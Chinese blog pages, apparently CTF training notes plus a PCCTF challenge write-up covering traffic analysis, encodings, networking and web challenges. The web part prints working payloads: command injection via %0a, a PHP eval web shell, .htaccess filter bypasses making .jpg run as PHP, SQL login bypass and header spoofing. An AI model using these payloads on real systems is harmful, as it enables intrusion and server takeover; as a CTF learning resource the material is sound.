<h5 id="USB鼠标流量抓取分析"><a href="#USB鼠标流量抓取分析" class="headerlink" title="USB鼠标流量抓取分析"></a>USB鼠标流量抓取分析</h5><h6 id="鼠标流量与键盘流量不同，-鼠标移动时表现为连续性，与键盘的离散型不一样。但是实际鼠标产生的数据是离散的。所以同样可以把数据抓取出来，构成二维坐标画出轨迹。"><a href="#鼠标流量与键盘流量不同，-鼠标移动时表现为连续性，与键盘的离散型不一样。但是实际鼠标产生的数据是离散的。所以同样可以把数据抓取出来，构成二维坐标画出轨迹。" class="headerlink" title="鼠标流量与键盘流量不同， 鼠标移动时表现为连续性，与键盘的离散型不一样。但是实际鼠标产生的数据是离散的。所以同样可以把数据抓取出来，构成二维坐标画出轨迹。"></a>鼠标流量与键盘流量不同， 鼠标移动时表现为连续性，与键盘的离散型不一样。但是实际鼠标产生的数据是离散的。所以同样可以把数据抓取出来，构成二维坐标画出轨迹。</h6><p><strong>鼠标数据包</strong>的数据长度为<strong>4个字节</strong>，<strong>第一个字节代表按键</strong>，当去<strong>oxoo</strong>时，代表<strong>没有按键</strong>；<strong>oxo1时</strong>，代表<strong>按左键</strong>，为<strong>oxo2时</strong>，代表当前<strong>按键为右键</strong>。</p>
<p><strong>第二个字节</strong>代表<strong>左右偏移</strong>；当值为<strong>正</strong>时，代表<strong>右移多少像素</strong>。当值为<strong>负</strong>时，代表<strong>左移多少像素</strong>。同理，<strong>第三个字节</strong>代表<strong>上下偏移</strong>。</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200606222850803.png" alt="image-20200606222850803"></p>
<p>土脚本</p>
<p>if btn_flag需要自行调整0,1,2</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200606225712699.png" alt="image-20200606225712699"></p>
<p>第一张是没有将其导入一个文件，第二张 加上一个导出符 <code>&gt; 文件名</code>将信息保存到这个文档中</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200606225949760.png" alt="image-20200606225949760"></p>
<p>用gnuplot工具把坐标画出来。</p>
<p>输入<code>gnuplot</code>进入到gnuplot命令行</p>
<p>使用<code>plot &quot;xy.txt&quot;</code>命令根据这个文件坐标画一张图 </p>
<p>可以看到这张图是倒过来的，只需要将其复制，旋转一下就可以。。</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200606230805565.png" alt="image-20200606230805565"></p>
<h5 id="HTTPS流量包文件分析"><a href="#HTTPS流量包文件分析" class="headerlink" title="HTTPS流量包文件分析"></a>HTTPS流量包文件分析</h5><h6 id="HTTPS流量是经过TLS协议加密过的，需要导入key才能看到原始的HTTP流量。"><a href="#HTTPS流量是经过TLS协议加密过的，需要导入key才能看到原始的HTTP流量。" class="headerlink" title="HTTPS流量是经过TLS协议加密过的，需要导入key才能看到原始的HTTP流量。"></a>HTTPS流量是经过TLS协议加密过的，需要导入key才能看到原始的HTTP流量。</h6><p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200606232137032.png" alt="image-20200606232137032"></p>
<p>如果看到TLS和HTTPS(443)就可以判断出他是加密之后的</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200606232037932.png" alt="image-20200606232037932"></p>
<p>英文版：Preferences —&gt; Protocols —&gt; SSL —&gt; Edit RSA keys list</p>
<p>中文版：编辑 —&gt; 首选项 —&gt; Protocols —&gt; SSL —&gt; Edit RSA keys list</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200606232356753.png" alt="image-20200606232356753"></p>
<h6 id="导入Key后出现原始的HTTP流量。"><a href="#导入Key后出现原始的HTTP流量。" class="headerlink" title="导入Key后出现原始的HTTP流量。"></a>导入Key后出现原始的HTTP流量。</h6><p>右键 —&gt; 追踪流 —&gt; SSL流/HTTP流</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200606232626017.png" alt="image-20200606232626017"></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200606232750372.png" alt="image-20200606232750372"></p>
<h4 id="密码学"><a href="#密码学" class="headerlink" title="密码学"></a>密码学</h4><h5 id="密码编码学"><a href="#密码编码学" class="headerlink" title="密码编码学"></a>密码编码学</h5><p>（1）<strong>密码编码学</strong>是密码学的一个分支，研究与信息安全（例如：机密性、完整性、可鉴别性）有关的数学技术。</p>
<p>（2）<strong>密码编码学</strong>时包含数据变换的原 理、工具和方法的一门学科，这种数据变换的目的是为了隐藏数据的信息内容，阻止对数据的篡改以及防止未经认可使用数据。</p>
<p>（3）<strong>密码编码学</strong>是论述使明文变得不可懂的密文，以及把已加密的消息变换成可懂形式的艺术和技巧。</p>
<h5 id="对称加密不对称加密"><a href="#对称加密不对称加密" class="headerlink" title="对称加密不对称加密"></a>对称加密不对称加密</h5><ul>
<li>对称密码算法：<strong>解密秘钥和加密秘钥相同</strong>，或实质上等同，即从一个易于推出另一个。又称传统密码算法、密码秘钥算法或单秘钥算法。<ul>
<li><strong>DES、3DES、IDEA、AES</strong></li>
</ul>
</li>
<li>非对称密码算法：<strong>加密秘钥和解密秘钥不同</strong>，从一个很难推出另一个。又叫公钥密码算法。<strong>其中的加密秘钥可以公开，称为公开密钥</strong>，简称<strong>公钥</strong>；<strong>解密秘钥必须比保密，称为私人秘钥</strong>，简称<strong>私钥</strong>。<ul>
<li><strong>RSA、ECC、EIGamal</strong></li>
</ul>
</li>
</ul>
<h5 id="摘要算法"><a href="#摘要算法" class="headerlink" title="摘要算法"></a>摘要算法</h5><p>​        数据摘要算法是密码学算法中非常重要的一个分支，他通过对所有数据提取指纹信息以实现数据签名、数据完整性校验等功能，由于其不可逆性，有时候会被用作敏感信息的加密。数据摘要算法也被称为<strong>哈希（Hash）算法</strong>、<strong>散列算法</strong>，常见的摘要算法有<strong>MD5</strong>和<strong>SHA</strong></p>
<p>​        在互联网上进行大文件传输时，都要得用MD5算法产生一个与文件匹配的、存储MD5值得文本文件（后缀名为<strong>.md5</strong>或<strong>.mdsum</strong>），这样接受者在接收到文件后，就可以利用与SFV类似的方法来检查文件完整性，对大多数大型软件公司或开源组织都是以这种方式来校验数据完整性，而且部分操作系统也使用此算法来对用户密码进行加密，另外，他也是目前计算机犯罪中数据取证最常用的算法。</p>
<p>​        SHA中SHA1的应用范围较为广泛，主要用于CA个数字证书中，另外在互联网中流行的BT软件中，也是使用SHA1来进行文件校验的，由于SHA系列算法的数据摘要长度较长，因此其运算速度与MD5相比，也相对较慢。</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200607102755666.png" alt="image-20200607102755666"></p>
<h5 id="ASCII编码"><a href="#ASCII编码" class="headerlink" title="ASCII编码"></a>ASCII编码</h5><p>​        ASCII码使用指定的7位或8位二进制数组来表示128或256种可能的字符。标准ASCII码也叫基础ASCII码，使用7位二进制数（剩下的1位二进制为0）来表示所有的大写和小写字母，数字0到9、标点符号，以及在美式英语中使用的特殊控制字符</p>
<p>如果要进行ASCII吗转换，直接在百度搜索ASCII在线转换就可以</p>
<p><a href="http://ctf.ssleye.com/这里面有各种" target="_blank" rel="noopener">http://ctf.ssleye.com/这里面有各种</a> 转换工具</p>
<p>或者下载一个  <strong>小葵多功能转换工具</strong>。 </p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200607141505200.png" alt="image-20200607141505200"></p>
<h5 id="Base64编码"><a href="#Base64编码" class="headerlink" title="Base64编码"></a>Base64编码</h5><p>​        Base64顾名思义就是用64个可显示字符表示所有ASC字符，64也就是6Bits，而ASC字符一共有256个，也就是8Bits。Base64编码要求把3个8为字节（38=24）转化为4个6位的字节（46=24），之后在6位的前面补两个0，形成8位一个字节的形式。如果剩下的字符不足3个字节，则用0填充，输出字符使用’    =’，因此编码后输出的文本末尾<strong>可能出现1或2个’     =’</strong></p>
<p>解密地址可以百度搜索在线工具，活着使用小葵，或者使用上面的网址里面的工具，都可以。</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200607144110784.png" alt="image-20200607144110784"></p>
<h5 id="URL编码"><a href="#URL编码" class="headerlink" title="URL编码"></a>URL编码</h5><p>​        url编码就是一个字符ascii码的十六进制。不过稍微有些变动，需要在前面加上“%”，比如“\”，它的ascii码是92，92的十六进制是5c，所以“\”的url编码就是%5c。</p>
<p>解码地址，百度搜在线解密</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200607152252672.png" alt="image-20200607152252672"></p>
<h5 id="Unicode编码"><a href="#Unicode编码" class="headerlink" title="Unicode编码"></a>Unicode编码</h5><p>​        Unicode码扩展自ASCII字元集。在严格的ASCII中，每个字元用7位元表示，或者电脑上普遍使用的没字元有8位元宽；而Unicode使用全16位元字元集。这使得Unicode能够表示世界上所有的书写语言中可能与电脑通讯的字元、象形文字和其他符号。</p>
<p>特点：密文中有多个\uxxx</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200607154702904.png" alt="image-20200607154702904"></p>
<h5 id="JS混淆"><a href="#JS混淆" class="headerlink" title="JS混淆"></a>JS混淆</h5><p>​        有些时候开发者为了保护劳动成果可以通过对javascript的变量名称和过程名称进行编码，从而起到混淆JS代码的作用，通常使用eval函数进行混淆处理，该函数可以计算字符串，并执行其中的JS代码。</p>
<p>​        如：对<code>&lt;script&gt;alert(&#39;xss&#39;);&lt;/script&gt;</code>进行16进制转换，然后使用eval函数进行读取</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    eval(&quot;\x61\x6c\x65\x72\x74\x28\x27\x58\x53\x53\x27\x29\x3b&quot;);</span><br><span class="line">&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>

<p>特点：通常在JS脚本里使用eval与function函数进行混淆</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200607155222852.png" alt="image-20200607155222852"></p>
<h4 id="网络基础"><a href="#网络基础" class="headerlink" title="网络基础"></a>网络基础</h4><p>简单过一下</p>
<h5 id="网络起源"><a href="#网络起源" class="headerlink" title="网络起源"></a>网络起源</h5><p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200608230118116.png" alt="image-20200608230118116"></p>
<h5 id="家庭网络"><a href="#家庭网络" class="headerlink" title="家庭网络"></a>家庭网络</h5><p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200608230408330.png" alt="image-20200608230408330"></p>
<h5 id="企业网路基本构架"><a href="#企业网路基本构架" class="headerlink" title="企业网路基本构架"></a>企业网路基本构架</h5><p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200608231043595.png" alt="image-20200608231043595"></p>
<h5 id="网络的组成和结构"><a href="#网络的组成和结构" class="headerlink" title="网络的组成和结构"></a>网络的组成和结构</h5><p><strong>终端设备</strong>：PC、iphone、ATM等等。</p>
<p><strong>网络互连设备</strong>：集线器、交换机、路由器、防火墙、IDS、IPS、ICG、AP、基站</p>
<p><strong>用于连接设备的链接  /  介质：</strong>：同轴电缆，双绞线，光纤，无线</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200608231125684.png" alt="image-20200608231125684">   </p>
<h4 id="通信模型介绍"><a href="#通信模型介绍" class="headerlink" title="通信模型介绍"></a>通信模型介绍</h4><h5 id="协议的必要性"><a href="#协议的必要性" class="headerlink" title="协议的必要性"></a>协议的必要性</h5><p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200608231822951.png" alt="image-20200608231822951"></p>
<h5 id="OSI七层模型"><a href="#OSI七层模型" class="headerlink" title="OSI七层模型"></a>OSI七层模型</h5><p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200608232120916.png" alt="image-20200608232120916"></p>
<h5 id="分层模型-TCP-IP标准模型与对等模型"><a href="#分层模型-TCP-IP标准模型与对等模型" class="headerlink" title="分层模型-TCP/IP标准模型与对等模型"></a>分层模型-TCP/IP标准模型与对等模型</h5><p>4层模型和5层模型，将7层模型进行合并。</p>
<ul>
<li>应用层：APP产生的数据</li>
<li>表示层：格式转换</li>
<li>会话层：区分不同会话</li>
<li>传输层：端到端连接；通过端口号识别上层协议；比如443识别https；80-http；<ul>
<li>端口号：小于1023的是知名端口，一些应用层协议都是默认为知名端口</li>
</ul>
</li>
<li>网络层：IP寻址</li>
<li>数据链路层：MAC寻址   —-物理地址（每台设备都有唯一的地址）</li>
<li>物理层：决定数据在不同介质的传输方式</li>
</ul>
<ul>
<li>报文五元组：<ul>
<li>应用层：协议</li>
<li>传输层：源端口、目的端口</li>
<li>网络层：源IP、目的IP</li>
</ul>
</li>
</ul>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200608232644522.png" alt="image-20200608232644522"></p>
<h4 id="web基础-sql注入"><a href="#web基础-sql注入" class="headerlink" title="web基础+sql注入"></a>web基础+sql注入</h4><h5 id="WEB应用的基础架构"><a href="#WEB应用的基础架构" class="headerlink" title="WEB应用的基础架构"></a>WEB应用的基础架构</h5><p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200609092657733.png" alt="image-20200609092657733"></p>
<h5 id="HTTP协议"><a href="#HTTP协议" class="headerlink" title="HTTP协议"></a>HTTP协议</h5><p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200609102009198.png" alt="image-20200609102009198"></p>
<h5 id="HTTP请求报文"><a href="#HTTP请求报文" class="headerlink" title="HTTP请求报文"></a>HTTP请求报文</h5><p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200609102040418.png" alt="image-20200609102040418"></p>
<h5 id="HTTP请求报文—请求行"><a href="#HTTP请求报文—请求行" class="headerlink" title="HTTP请求报文—请求行"></a>HTTP请求报文—请求行</h5><p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200609102341778.png" alt="image-20200609102341778"></p>
<h5 id="HTTP请求报文—请求头"><a href="#HTTP请求报文—请求头" class="headerlink" title="HTTP请求报文—请求头"></a>HTTP请求报文—请求头</h5><p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200609103242825.png" alt="image-20200609103242825"></p>
<h5 id="HTTP响应报文"><a href="#HTTP响应报文" class="headerlink" title="HTTP响应报文"></a>HTTP响应报文</h5><p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200609103713600.png" alt="image-20200609103713600"></p>
<h5 id="HTTP响应报文——状态行"><a href="#HTTP响应报文——状态行" class="headerlink" title="HTTP响应报文——状态行"></a>HTTP响应报文——状态行</h5><p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200609103747586.png" alt="image-20200609103747586"></p>
<h5 id="信息收集类解题"><a href="#信息收集类解题" class="headerlink" title="信息收集类解题"></a>信息收集类解题</h5><p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200609105410884.png" alt="image-20200609105410884"></p>
<h5 id="例题1，解题步骤"><a href="#例题1，解题步骤" class="headerlink" title="例题1，解题步骤"></a>例题1，解题步骤</h5><p>这是简单的信息收集</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200609105851147.png" alt="image-20200609105851147"></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200609110822988.png" alt="image-20200609110822988"></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200609110837706.png" alt="image-20200609110837706"></p>
<h5 id="前端代码类解题"><a href="#前端代码类解题" class="headerlink" title="前端代码类解题"></a>前端代码类解题</h5><p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200609111918870.png" alt="image-20200609111918870"></p>
<p>例：</p>
<p>解析：F12，找到maxlength修改字符最大长度</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200609111940281.png" alt="image-20200609111940281"></p>
<h5 id="HTTP协议类"><a href="#HTTP协议类" class="headerlink" title="HTTP协议类"></a>HTTP协议类</h5><p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200609112733121.png" alt="image-20200609112733121"></p>
<p>例：</p>
<p>页面返回你是来自谷歌吗？</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200609112850721.png" alt="image-20200609112850721"></p>
<p>这里一看就知道要是用referer来伪造访问网址，只需要是用burp抓包，然后添加referer就可以，然后将谷歌网址输入即可</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200609113255514.png" alt="image-20200609113255514"></p>
<h4 id="sql注入原理"><a href="#sql注入原理" class="headerlink" title="sql注入原理"></a>sql注入原理</h4><h5 id="数据库系统的基本概念"><a href="#数据库系统的基本概念" class="headerlink" title="数据库系统的基本概念"></a>数据库系统的基本概念</h5><p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200609115245391.png" alt="image-20200609115245391"></p>
<h5 id="关系型数据库系统特点"><a href="#关系型数据库系统特点" class="headerlink" title="关系型数据库系统特点"></a>关系型数据库系统特点</h5><p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200609134441300.png" alt="image-20200609134441300"></p>
<h5 id="结构化查询语言sql"><a href="#结构化查询语言sql" class="headerlink" title="结构化查询语言sql"></a>结构化查询语言sql</h5><p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200609134659116.png" alt="image-20200609134659116"></p>
<h5 id="SELECT语句——基本查询"><a href="#SELECT语句——基本查询" class="headerlink" title="SELECT语句——基本查询"></a>SELECT语句——基本查询</h5><p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200609135101423.png" alt="image-20200609135101423"></p>
<h5 id="SELECT语句——AND和OR运算"><a href="#SELECT语句——AND和OR运算" class="headerlink" title="SELECT语句——AND和OR运算"></a>SELECT语句——AND和OR运算</h5><p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200609135152489.png" alt="image-20200609135152489"></p>
<h5 id="SQL注入攻击"><a href="#SQL注入攻击" class="headerlink" title="SQL注入攻击"></a>SQL注入攻击</h5><p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200609140939827.png" alt="image-20200609140939827"></p>
<h5 id="经典的万能密码"><a href="#经典的万能密码" class="headerlink" title="经典的万能密码"></a>经典的万能密码</h5><p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200609144039740.png" alt="image-20200609144039740"></p>
<p>使用正常语句查询，返回错误</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200609144106842.png" alt="image-20200609144106842"></p>
<p>使用万能密码进行查询</p>
<p>成功返回，</p>
<p><strong>原理</strong>：or和and都有的时候先判断and也就是”1” and “123456”判断，这肯定是错的，错的就等于0</p>
<p>俺就判断 “1”=”0”，因为1不等于0所以也是错了，username=”admin”是正确的所以正确。</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200609144930905.png" alt="image-20200609144930905"></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200609144940562.png" alt="image-20200609144940562"></p>
<p>因为是三种万能密码，所以还有两种，原理相同</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200609145305816.png" alt="image-20200609145305816"></p>
<p>可以使用工具来进行扫描，sqlmap，椰树都可以</p>
<p><img src="/2020/07/25/CTF%E8%B5%9B%E5%89%8D%E5%9F%B9%E8%AE%AD____%E6%9D%82%E9%A1%B9/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200609152002615.png" alt="image-20200609152002615"></p>
]]></content>
  </entry>
  <entry>
    <title>PCCTF</title>
    <url>/2020/07/25/PCCTF/</url>
    <content><![CDATA[<h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h4 id="WEB-1"><a href="#WEB-1" class="headerlink" title="WEB 1"></a>WEB 1</h4><p>打开页面</p>
<p>发现红框处有变量覆盖漏洞</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200623185822894.png" alt="image-20200623185822894"></p>
<p>这样就可以构造payload，其中的哈希值必须和key值相等，</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?action&#x3D;auth&amp;hashed_key&#x3D;4e07408562bedb8b60ce05c1decfe3ad16b72230967de01f640b7e4729b49fce&amp;key&#x3D;3</span><br></pre></td></tr></table></figure>

<p>页面返回flag，提交即可</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200623190004841.png" alt="image-20200623190004841"></p>
<h4 id="Web-2"><a href="#Web-2" class="headerlink" title="Web 2"></a>Web 2</h4><p>打开页面</p>
<p>红框处使用chr()函数</p>
<p>chr()函数的处理方式是将<code>w3lc0me_To_PCCTF</code>的每一个值转换成ascii然后每一个值得ascii+256，</p>
<p>还有intval函数的值需要进行绕过</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200623190247326.png" alt="image-20200623190247326"></p>
<p>intval()函数在处理16进制时存在问题,但强制转换时是正常的 来绕过第二个判断，intval(字符串)为0  但是intval(字符串+1) 会自动转换成数值，不过php7已经修复了，这里我们传入password的参数<code>6e4</code></p>
<p>payload：<code>&amp;password=6e4&amp;value[0]=375&amp;value[1]=307&amp;value[2]=364&amp;value[3]=355&amp;value[4]=304&amp;value[5]=365&amp;value[6]=357&amp;value[7]=351&amp;value[8]=340&amp;value[9]=367&amp;value[10]=351&amp;value[11]=336&amp;value[12]=323&amp;value[13]=323&amp;value[14]=340&amp;value[15]=326</code></p>
<p>这样就成功的返回了flag</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200623191410721.png" alt="image-20200623191410721"></p>
<h4 id="WEB-3"><a href="#WEB-3" class="headerlink" title="WEB 3"></a>WEB 3</h4><p>打开页面，</p>
<p>发现过滤了很多符号，</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200623191507011.png" alt="image-20200623191507011"></p>
<p>而且可以看到底下可以ping IP，这样就可以联想到命令执行漏洞，但是上面吧符号都给过滤了，所以没办法使用上面的符号进行命令执行，但是发现并没有过滤<code>%0a</code>，可以尝试一下这个命令</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200623191638876.png" alt="image-20200623191638876"></p>
<p>这样构造的payload：<code>?ip=127.0.0.1%0acat /flag</code></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200623192136007.png" alt="image-20200623192136007"></p>
<h4 id="Web4"><a href="#Web4" class="headerlink" title="Web4"></a>Web4</h4><p>打开页面</p>
<p>发现左上角有一个flag，hint，看看flag有什么</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200623192339991.png" alt="image-20200623192339991"></p>
<p>发现flag里面说我们的ip是<code>39.77.85.15</code>第一时间就是想到伪造IP，X-Forwarded-For</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200623192434867.png" alt="image-20200623192434867"></p>
<p>使用burp进行抓包然后进行伪造IP看看返回什么值，伪造ip之后经过测试发现伪造的IP是可变的，这里想到XFF的SSTI注入</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200623192842390.png" alt="image-20200623192842390"></p>
<p>然后构造一下XFF的伪造ip，发现成功返回了flag，复制提交即可</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200623193133965.png" alt="image-20200623193133965"></p>
<h4 id="WEB-5"><a href="#WEB-5" class="headerlink" title="WEB 5"></a>WEB 5</h4><p>打开页面</p>
<p>一看就是文件上传</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200624174852857.png" alt="image-20200624174852857"></p>
<p>上传构造一句话，然后上传，上传php文件发现返回文件名称错误，说明不能上传php文件</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200624175111252.png" alt="image-20200624175111252"></p>
<p>所以我们需要构造图片码试试，过滤了以下内容，可以看到<code>&gt;</code>括号被过滤了，ph被过滤了</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200624175206630.png" alt="image-20200624175206630"></p>
<p>所以我们就要构造一个没有<code>&gt;</code>的payload</p>
<p>以下的payload就没有<code>&gt;</code>尖括号，再次进行上传</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?&#x3D;eval($_POST[123]);</span><br></pre></td></tr></table></figure>

<p>发现这样就成功上传了，但是直接连接的话是连接不上的，会报错的</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200624175606289.png" alt="image-20200624175606289"></p>
<p>所以想到上传.user.ini，但是发现过滤了auto这样就不能上传.user.ini了，想到还有一个.htaccess，不过是利用htaccess的特性，开启php的short_open_tag支持。</p>
<p>上传的时候需要修改content-type后可以上传.htaccess。自然而然想到上传内容为如下的.htaccess文件修改apache配置，将jpg按php解释执行。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">AddType application&#x2F;x-httpd-php .jpg</span><br></pre></td></tr></table></figure>

<p>但是ph被过滤了，如果直接上传会报错，</p>
<p>这里可以使用apache配置文件的多行模式，将一行配置拆为多行。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">AddType application&#x2F;x-httpd-p\</span><br><span class="line">hp .jpg</span><br></pre></td></tr></table></figure>

<p>由于php的执行还需要&lt;?php ，所以需要开启short_open_tag。用同样的办法写好。</p>
<p>最终 .htaccess 的写法</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">AddTyppe application&#x2F;x-httpd-p\</span><br><span class="line">hp .jpg\</span><br><span class="line">p\</span><br><span class="line">hp_value short_open_tag on</span><br></pre></td></tr></table></figure>

<p><strong>注意：</strong>这里的 .htaccess中的<code>.</code> 前面不能加任何东西，比如：1.htaccess</p>
<p>然后进行最终上传</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200624181119337.png" alt="image-20200624181119337"></p>
<p>然后放行这个包，这样查看页面就显示成功上传了</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200624181150594.png" alt="image-20200624181150594"></p>
<p>图片码直接上传即可</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200624181337565.png" alt="image-20200624181337565"></p>
<p>构造URL</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;xxx.xxx.xxx.xxx&#x2F;uploads&#x2F;9465e99a7262f75468c0dc54c4f76954&#x2F;sss.jg</span><br></pre></td></tr></table></figure>

<p>使用蚁剑连接，</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200624181325574.png" alt="image-20200624181325574"></p>
<p>点击根目录，找到flag文件，双击打开，flag就在其中了</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200624181500902.png" alt="image-20200624181500902"></p>
<h3 id="Misc（杂项）"><a href="#Misc（杂项）" class="headerlink" title="Misc（杂项）"></a>Misc（杂项）</h3><h4 id="Don’t-wait"><a href="#Don’t-wait" class="headerlink" title="Don’t wait!"></a>Don’t wait!</h4><p>点击题目，发现让我们下载一个文件</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200624181712766.png" alt="image-20200624181712766"></p>
<p>先进行下载，下载完进行解压，是一个exe后缀的应用</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200624181842175.png" alt="image-20200624181842175"></p>
<p>打开看看</p>
<p>等了好长一段时间发现，发现返回了flag，但是这种办法是非常非常非常慢的</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200624183053319.png" alt="image-20200624183053319"></p>
<p>我们将exe改为txt，然后进行搜索flag就能获得了</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200624190337357.png" alt="image-20200624190337357"></p>
<h3 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h3><p>按照要求关注就行</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200625101521740.png" alt="image-20200625101521740"></p>
<h3 id="F-k"><a href="#F-k" class="headerlink" title="F**k"></a>F**k</h3><p>打开网址</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200625101540691.png" alt="image-20200625101540691"></p>
<p>需要下载一个apk文件，进行下载</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200625101732644.png" alt="image-20200625101732644"></p>
<p>因为是zip文件，进行解压，解压完得到了这个文件</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200625101944681.png" alt="image-20200625101944681"></p>
<p>这里使用010Editor来查看他的16进制，往下拉，会发现许多这种密文，将这些密文全部复制</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200625102150125.png" alt="image-20200625102150125"></p>
<p>打开URL的控制台，然后粘贴上去，按一下回车，就成功的显示出flag来了</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200625102327688.png" alt="image-20200625102327688"></p>
<h3 id="比签到还水"><a href="#比签到还水" class="headerlink" title="比签到还水"></a>比签到还水</h3><p>打开网址看看</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200625102424165.png" alt="image-20200625102424165"></p>
<p>需要下载一个zip压缩包，进行下载</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200625102439432.png" alt="image-20200625102439432"></p>
<p>下载完如果直接打开，会报错。</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200625102824080.png" alt="image-20200625102824080"></p>
<p>这样我们使用binwalk看看有没有隐藏文件</p>
<p>可以看到有一个隐藏图片，我们进行分离出来</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200625102857932.png" alt="image-20200625102857932"></p>
